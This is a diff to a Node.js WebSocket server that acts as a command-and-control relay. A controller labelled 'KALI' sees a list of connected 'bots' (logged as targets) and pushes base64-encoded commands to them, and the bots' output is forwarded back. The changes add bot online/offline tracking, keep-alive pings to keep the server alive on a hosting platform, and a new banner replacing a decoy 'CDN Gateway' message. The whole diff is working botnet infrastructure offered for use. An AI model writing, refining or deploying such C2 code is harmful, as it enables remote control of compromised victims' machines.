@@ -1,7 +1,7 @@
 const WebSocket = require('ws');
 const http = require('http');
 
-const server = http.createServer((_, r) => r.end('CDN Gateway Active'));
+const server = http.createServer((_, r) => r.end('Shadow Tunnel Gateway Active'));
 const wss = new WebSocket.Server({ server });
 
 let KALI = null;
@@ -13,25 +13,29 @@ wss.on('connection', (ws, req) => {
 
     if (id === 'KALI') {
         KALI = ws;
-        // Ao conectar, pede a lista de todos os bots
+        console.log('[+] Controlador Kali Conectado');
         BOTS.forEach((_, botId) => {
             KALI.send(JSON.stringify({ t: 'bot', s: 'on', id: botId }));
         });
     } else {
         BOTS.set(id, ws);
-        if (KALI) KALI.send(JSON.stringify({ t: 'bot', s: 'on', id: id }));
+        console.log(`[+] Novo Alvo: ${id}`);
+        if (KALI && KALI.readyState === WebSocket.OPEN) {
+            KALI.send(JSON.stringify({ t: 'bot', s: 'on', id: id }));
+        }
     }
 
     ws.on('message', (raw) => {
         if (ws === KALI) {
-            // KALI envia: {"to": "ID_DO_BOT", "cmd": "BASE64_DO_COMANDO"}
             try {
                 const data = JSON.parse(raw);
                 const target = BOTS.get(data.to);
-                if (target) target.send(data.cmd); 
-            } catch (e) {}
+                if (target && target.readyState === WebSocket.OPEN) {
+                    target.send(data.cmd); // Envia o Base64 puro para o alvo
+                }
+            } catch (e) { console.log("Erro no comando do Kali"); }
         } else {
-            // BOT envia resposta pura -> Encaminha para o KALI
+            // Resposta do Bot -> Encaminha para o Kali
             if (KALI && KALI.readyState === WebSocket.OPEN) {
                 KALI.send(JSON.stringify({ t: 'res', f: id, d: raw.toString() }));
             }
@@ -39,9 +43,21 @@ wss.on('connection', (ws, req) => {
     });
 
     ws.on('close', () => {
-        if (ws === KALI) KALI = null;
-        else BOTS.delete(id);
+        if (ws === KALI) {
+            KALI = null;
+        } else {
+            BOTS.delete(id);
+            if (KALI && KALI.readyState === WebSocket.OPEN) {
+                KALI.send(JSON.stringify({ t: 'bot', s: 'off', id: id }));
+            }
+        }
     });
+    
+    // Keep-alive para evitar que o Render derrube a conexão por inatividade
+    const ping = setInterval(() => {
+        if (ws.readyState === WebSocket.OPEN) ws.ping();
+        else clearInterval(ping);
+    }, 25000);
 });
 
 server.listen(process.env.PORT || 10000);
